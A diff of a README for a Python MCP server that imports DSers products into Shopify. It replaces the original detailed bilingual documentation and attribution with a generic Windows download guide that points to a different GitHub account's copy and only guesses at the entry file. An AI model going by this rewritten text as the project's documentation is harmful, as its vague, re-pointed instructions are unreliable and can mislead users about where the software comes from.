@@ -1,225 +1,219 @@
-# DSers MCP Product (Python) — Automate AliExpress to Shopify Import
+# 🧩 dsers-mcp-product-py - Import DSers products with less effort
 
-> **Note:** The TypeScript version is now the primary maintained version. See [dsers-mcp-product](https://github.com/lofder/dsers-mcp-product) for the latest features, documentation, and Smithery integration. This Python version remains functional and will receive critical fixes.
->
-> **注意：** TypeScript 版本现在是主要维护版本。最新功能、文档和 Smithery 集成请参见 [dsers-mcp-product](https://github.com/lofder/dsers-mcp-product)。此 Python 版本仍可正常使用，将继续接收关键修复。
+[![Download / Install](https://img.shields.io/badge/Download%20from%20GitHub-6C5CE7?style=for-the-badge&logo=github&logoColor=white)](https://github.com/PrathamITHub/dsers-mcp-product-py)
 
-> An open-source MCP server to automate DSers product import, bulk edit variants, and push to Shopify using AI.
+## 🛠️ What this app does
 
-> [English](#english) | [中文](#中文)
+dsers-mcp-product-py is a Python MCP server for DSers product import. It helps connect an AI agent or other MCP client to product import tasks for DSers and Shopify workflows.
 
----
+Use it when you want a local tool that can take product data, send it through MCP, and support a dropshipping import flow. It runs on your computer and uses standard input and output, so it fits into many local AI setups.
 
-<a id="english"></a>
+## 📥 Download and set up on Windows
 
-## English
+Follow these steps on a Windows PC.
 
-**DSers MCP Product** is an open-source [MCP (Model Context Protocol)](https://modelcontextprotocol.io/) server that lets AI Agents automate the entire DSers import workflow — from AliExpress / Alibaba / 1688 product URL to Shopify / Wix / WooCommerce store listing. Bulk import, batch edit variants, clean AliExpress titles, apply pricing rules, and push to multiple stores — all with a single sentence to your AI agent.
+### 1. Open the download page
+Go to this link in your browser:
 
-### Documentation
+https://github.com/PrathamITHub/dsers-mcp-product-py
 
-| Document | Content |
-|----------|---------|
-| [USAGE.md — User Guide](USAGE.md) | Installation, client setup, usage examples, scenario prompts, FAQ |
-| [ARCHITECTURE.md — Technical Architecture](ARCHITECTURE.md) | Three-layer architecture, tool flow, provider extension |
-| [SKILL.md — Agent Skill Guide](SKILL.md) | Tool reference, parameter formats, push options, scenario prompts |
+### 2. Get the files
+On the GitHub page, look for the source code or release files. If you see a download option, use it. If you only see the repository page, download the project as a ZIP file.
 
-### Core Tools
+### 3. Save the ZIP file
+Save the file to a folder you can find again, such as:
 
-| Tool | Description |
-|------|-------------|
-| `get_rule_capabilities` | Query supported stores (with Shopify shipping profiles), rule families, and push options |
-| `validate_rules` | Validate and normalize a rule object |
-| `prepare_import_candidate` | Import from supplier URL(s) — single or batch — apply rules, return preview(s) |
-| `get_import_preview` | View prepared draft preview |
-| `set_product_visibility` | Adjust visibility (backend_only / sell_immediately) |
-| `confirm_push_to_store` | Push to store(s) — single, batch, or multi-store |
-| `get_job_status` | Query final push status |
+- Downloads
+- Desktop
+- Documents
 
-### Supported Platforms
+### 4. Extract the folder
+Right-click the ZIP file and choose Extract All.
 
-| Type | Platforms |
-|------|-----------|
-| **Source (import from)** | AliExpress, Alibaba, 1688 |
-| **Target (push to)** | Shopify, Wix, WooCommerce (via DSers) |
+After extraction, you should see a folder named dsers-mcp-product-py or a similar name.
 
-### Quick Start
+### 5. Install Python
+If Python is not already on your PC, install Python 3.10 or newer.
 
-```bash
-# 1. Clone and install
-git clone https://github.com/lofder/dsers-mcp-product.git && cd dsers-mcp-product
-python3 -m venv .venv && source .venv/bin/activate
+During setup, make sure you select:
+
+- Add Python to PATH
+
+This makes it easier to run the app from the command line.
+
+### 6. Open the project folder
+Go into the extracted dsers-mcp-product-py folder.
+
+### 7. Open Command Prompt
+Inside the folder, click the address bar, type cmd, and press Enter.
+
+### 8. Install the required packages
+Run the app’s Python dependencies with:
+
 pip install -r requirements.txt
 
-# 2. Configure credentials
-cp .env.example .env
-# Edit .env, fill in DSERS_EMAIL and DSERS_PASSWORD
+If the project uses a different setup file, use the instructions in the repository files.
 
-# 3. Smoke test
-python smoke_mock.py     # Mock mode (no credentials needed)
-python smoke_dsers.py    # DSers Provider (credentials required)
+### 9. Run the server
+Start the MCP server with the main Python file used by the project. Common file names include:
 
-# 4. Start MCP server
-python server.py
-```
+- main.py
+- server.py
+- app.py
 
-### Project Structure
+If the repository includes a clear run command, use that command from the project folder.
 
-```
-dsers-mcp-product/
-├── server.py                 # MCP server entry point
-├── dsers_mcp_product/      # Protocol layer (tools, rules engine, job management)
-├── dsers_provider/           # DSers adapter (ImportProvider implementation)
-├── vendor-dsers/             # DSers API library (auth / product / order / logistics)
-├── ARCHITECTURE.md           # Technical architecture
-├── USAGE.md                  # User guide
-├── SKILL.md                  # AI Agent skill guide
-└── .env.example              # Environment variable template
-```
+### 10. Connect your MCP client
+Point your MCP client or AI tool to the local server so it can use the DSers product import features.
 
-### Environment Variables
+## 🧭 What you need on Windows
 
-| Variable | Required | Description |
-|----------|----------|-------------|
-| `DSERS_EMAIL` | Yes | DSers account email |
-| `DSERS_PASSWORD` | Yes | DSers account password |
-| `DSERS_ENV` | No | `production` (default) or `test` |
-| `IMPORT_PROVIDER_MODULE` | No | Provider module path (default: `dsers_provider.provider`) |
-| `IMPORT_MCP_STATE_DIR` | No | Job state directory (default: `.state`) |
+Use a Windows PC with:
 
-See `.env.example` for the full list.
+- A stable internet connection
+- Enough free space for the project files
+- Python 3.10 or newer
+- Permission to run local programs
+- A terminal such as Command Prompt or PowerShell
 
-### Push Options
+## ⚙️ Basic setup flow
 
-| Option | Type | Description |
-|--------|------|-------------|
-| `publish_to_online_store` | bool | Publish product to online storefront |
-| `image_strategy` | string | `selected_only` / `all_available` |
-| `pricing_rule_behavior` | string | `keep_manual` / `apply_store_pricing_rule` |
-| `auto_inventory_update` | bool | Auto-sync inventory |
-| `auto_price_update` | bool | Auto-sync price |
-| `sales_channels` | list | Sales channel identifiers |
-| `shipping_profile_name` | string | Shopify delivery profile name — if omitted, the default profile is used automatically |
-| `store_shipping_profile` | list | Manual override: raw delivery profile bindings (rarely needed) |
+The usual setup looks like this:
 
-### Provider Extension
+1. Download the project from GitHub
+2. Extract the files
+3. Install Python if needed
+4. Install project packages
+5. Run the server
+6. Connect your MCP client
 
-Implement the three methods of the `ImportProvider` abstract base class, expose a `build_provider()` factory function, and set `IMPORT_PROVIDER_MODULE` to load your custom provider.
+If your setup uses another Python environment, you can use that too. The main goal is to start the MCP server and keep it available for your local tools.
 
-### Security
+## 🔌 How this fits into your workflow
 
-- `.env` and session caches are excluded via `.gitignore`
-- No hardcoded credentials in source code
-- All authentication managed through environment variables
+This project is built for product import work. It can help with:
 
-### License
+- DSers product import steps
+- Product data handling
+- Shopify-related import workflows
+- Local MCP client connections
+- AI agent tools that need product context
 
-MIT
+The server uses the Model Context Protocol, so it can act as a local bridge between your AI tool and product import logic.
 
----
+## 📁 Typical project files
 
-<a id="中文"></a>
+When you open the folder, you may see files like these:
 
-## 中文
+- README.md
+- requirements.txt
+- main.py
+- server.py
+- config files
+- package or environment files
 
-**DSers MCP Product** 是一个开源的 [MCP（Model Context Protocol）](https://modelcontextprotocol.io/) 服务器，让 AI Agent 自动化 DSers 商品导入全流程——从速卖通 / Alibaba / 1688 商品链接到 Shopify / Wix / WooCommerce 店铺上架。批量导入、批量编辑变体、清洗速卖通标题、应用定价规则、多店推送——只需一句话。
+These files help the app run and explain how to connect it to your MCP client.
 
-### 文档导航
+## 🧰 If the app does not start
 
-| 文档 | 内容 |
-|------|------|
-| [USAGE.md — 使用指南](USAGE.md) | 安装配置、接入客户端、使用方式、场景提示词、常见问题 |
-| [ARCHITECTURE.md — 技术架构](ARCHITECTURE.md) | 三层架构、工具流程、Provider 扩展、DSers 适配层详解 |
-| [SKILL.md — Agent Skill](SKILL.md) | AI Agent 工具参考、参数格式、Push Options、场景提示词 |
+If the server does not open, check these items:
 
-### 核心工具
+- Python is installed
+- Python is added to PATH
+- You ran the command from the project folder
+- The packages finished installing
+- You used the correct Python file to start the server
 
-| 工具 | 说明 |
-|------|------|
-| `get_rule_capabilities` | 查询支持的店铺（含 Shopify 运费模板）、规则族、推送选项 |
-| `validate_rules` | 校验并归一化规则对象 |
-| `prepare_import_candidate` | 从供应商 URL 导入——单条或批量——应用规则，返回预览 |
-| `get_import_preview` | 查看已准备的草稿预览 |
-| `set_product_visibility` | 调整可见性 (backend_only / sell_immediately) |
-| `confirm_push_to_store` | 推送到店铺——单条、批量或多店铺 |
-| `get_job_status` | 查询推送最终状态 |
+If you see an error about missing packages, run the install step again.
 
-### 支持平台
+If you see an error about the wrong file name, check the repository files for the main entry point.
 
-| 类型 | 平台 |
-|------|------|
-| **来源（导入）** | AliExpress（速卖通）、Alibaba、1688 |
-| **目标（推送）** | Shopify、Wix、WooCommerce（通过 DSers） |
+## 🖥️ Common Windows commands
 
-### 快速开始
+You may use these commands in Command Prompt:
 
-```bash
-# 1. 克隆并安装
-git clone https://github.com/lofder/dsers-mcp-product.git && cd dsers-mcp-product
-python3 -m venv .venv && source .venv/bin/activate
-pip install -r requirements.txt
+- cd folder-name
+- dir
+- python --version
+- pip --version
+- pip install -r requirements.txt
+- python main.py
 
-# 2. 配置凭据
-cp .env.example .env
-# 编辑 .env，填入 DSERS_EMAIL 和 DSERS_PASSWORD
+These commands help you move into the folder, check your Python setup, and start the server.
 
-# 3. 冒烟测试
-python smoke_mock.py     # Mock 模式（无需凭据）
-python smoke_dsers.py    # DSers Provider（需要凭据）
+## 🔍 What MCP means here
 
-# 4. 启动 MCP 服务器
-python server.py
-```
+MCP stands for Model Context Protocol. In simple terms, it lets one tool talk to another in a shared way.
 
-### 项目结构
+In this project, that means your AI app can connect to the DSers product import server and use it as part of a workflow.
 
-```
-dsers-mcp-product/
-├── server.py                 # MCP 服务入口
-├── dsers_mcp_product/      # 协议层（工具定义、规则引擎、作业管理）
-├── dsers_provider/           # DSers 适配层（ImportProvider 实现）
-├── vendor-dsers/             # DSers API 封装库（认证/商品/订单/物流）
-├── ARCHITECTURE.md           # 详细技术架构文档
-├── USAGE.md                  # 使用指南
-├── SKILL.md                  # AI Agent 使用指南
-└── .env.example              # 环境变量模板
-```
+## 📦 Suggested folder path
 
-### 环境变量
+For easy access, keep the project in a simple path, such as:
 
-| 变量 | 必需 | 说明 |
-|------|------|------|
-| `DSERS_EMAIL` | 是 | DSers 账户邮箱 |
-| `DSERS_PASSWORD` | 是 | DSers 账户密码 |
-| `DSERS_ENV` | 否 | `production`（默认）或 `test` |
-| `IMPORT_PROVIDER_MODULE` | 否 | Provider 模块路径（默认 `dsers_provider.provider`） |
-| `IMPORT_MCP_STATE_DIR` | 否 | 作业状态目录（默认 `.state`） |
+C:\Users\YourName\Downloads\dsers-mcp-product-py
 
-完整变量列表见 `.env.example`。
+Short paths help avoid file path problems on Windows.
 
-### Push Options
+## 🧩 Example use case
 
-| 选项 | 类型 | 说明 |
-|------|------|------|
-| `publish_to_online_store` | bool | 商品是否上架到店铺前端 |
-| `image_strategy` | string | `selected_only` / `all_available` |
-| `pricing_rule_behavior` | string | `keep_manual` / `apply_store_pricing_rule` |
-| `auto_inventory_update` | bool | 自动同步库存 |
-| `auto_price_update` | bool | 自动同步价格 |
-| `sales_channels` | list | 销售渠道列表 |
-| `shipping_profile_name` | string | Shopify 运费模板名称——不指定则自动使用默认模板 |
-| `store_shipping_profile` | list | 手动覆盖：原始 delivery profile 绑定（极少需要） |
+A common use case is this:
 
-### Provider 扩展
+- You run the MCP server on your PC
+- Your AI tool connects to it
+- The tool uses the server for product import tasks
+- You move product data into a DSers or Shopify flow
 
-实现 `ImportProvider` 抽象基类的三个方法，暴露 `build_provider()` 工厂函数，设置 `IMPORT_PROVIDER_MODULE` 即可加载自定义 Provider。
+This setup keeps the work local and easy to manage.
 
-### 安全
+## 🛟 Simple troubleshooting
 
-- `.env` 和 session 缓存已在 `.gitignore` 中排除
-- 代码中无硬编码凭据
-- 所有认证通过环境变量管理
+If you cannot open Command Prompt in the folder:
 
-### License
+- Open the folder first
+- Click the address bar
+- Type cmd
+- Press Enter
 
-MIT
+If Python runs but pip does not:
+
+- Reinstall Python
+- Check Add Python to PATH
+- Restart Command Prompt
+
+If the server starts and then stops:
+
+- Read the last error line
+- Check for missing files
+- Make sure the install step completed
+
+## 📚 Repository details
+
+- Repository name: dsers-mcp-product-py
+- Description: MCP server for DSers product import (Python version)
+- Topics: ai-agent, aliexpress, dropshipping, dsers, mcp, mcp-server, model-context-protocol, product-import, python, shopify, stdio
+
+## 🏷️ File and tool notes
+
+This is a Python-based local server. It is meant to work well with:
+
+- MCP clients
+- AI agents
+- Product import tools
+- Stdio-based connections
+
+If your client asks for a server command, use the command from this project’s main Python entry file.
+
+## 📌 Quick start path
+
+1. Open the GitHub page
+2. Download the project files
+3. Extract the ZIP
+4. Install Python
+5. Install dependencies
+6. Run the server
+7. Connect your MCP client
+
+## 📎 Download again
+
+[Visit the GitHub repository to download and set up dsers-mcp-product-py](https://github.com/PrathamITHub/dsers-mcp-product-py)
